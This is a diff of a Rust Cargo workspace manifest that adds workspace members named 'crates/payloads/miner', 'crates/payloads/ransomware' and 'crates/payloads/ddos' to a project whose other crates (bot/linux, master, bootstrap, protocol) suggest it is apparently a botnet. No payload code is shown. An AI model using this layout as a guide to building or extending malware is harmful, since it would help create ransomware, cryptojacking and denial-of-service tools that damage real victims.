@@ -5,8 +5,12 @@ members = [
     "crates/bot/linux",
     "crates/bootstrap",
     "crates/master",
-    "crates/protocol"
-, "test_feature"]
+    "crates/protocol",
+    "test_feature",
+    "crates/payloads/miner",
+    "crates/payloads/ransomware",
+    "crates/payloads/ddos"
+]
 
 [profile.release]
 strip = true       # Strip symbols
